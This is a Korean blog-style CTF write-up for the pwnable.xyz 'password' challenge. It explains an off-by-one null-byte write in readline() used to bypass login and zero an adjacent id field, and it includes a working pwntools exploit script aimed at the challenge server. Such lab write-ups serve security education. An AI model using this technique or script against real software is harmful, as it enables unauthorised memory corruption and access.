---
title: "[pwnable.xyz]password"
date: 2020-2-4
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

보호기법 다 걸려있다.

```
[*] '/vagrant/ctfs/challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

여기서 취약점 터진다. 널바이트를 보내게되면 메모리주소 -1 위치를 0으로 셋팅해줄 수 있다.

```c
__int64 __fastcall readline(void *a1, int a2)
{
  int v2; // eax

  read(0, a1, a2);
  v2 = strlen(a1);
  *(a1 + v2 - 1) = 0;
  return (v2 - 1);
}
```

우선 login() 함수에서 readline()할 때 널로 보내게 되면 bypass 할 수 있다. 그러면 creds가 1로 셋팅되고 2번 메뉴를 사용할 수 있게 된다. 거기서 memset으로 flag를 다 널바이트로 바꿔준다. 그리고 여기서도 readline()으로 flag에 입력을 받는다. 근데 flag바로 뒤에 id가 존재해서 id를 0으로 덮어줄 수 있다. id를 0으로 만들었으니까 3번 메뉴로 flag를 읽어올 수 있다. 하지만 memset 해줬으니까 다시 flag를 읽어오는 4번 메뉴를 사용해서 flag 읽어오고 id는 0이니까 3번 메뉴로 flag 출력해주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30026)
win = e.symbols['win']
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def login(password):
	sla('>','1')
	sa(':',password)

def change(password):
	sla('>','2')
	sa(': \n',password)

def printf():
	sla('>','3')

def logout():
	sla('>','4')

sa(':','1234') # User ID:
login('\x00')
change('\x00')
logout()
printf()

p.interactive()
```

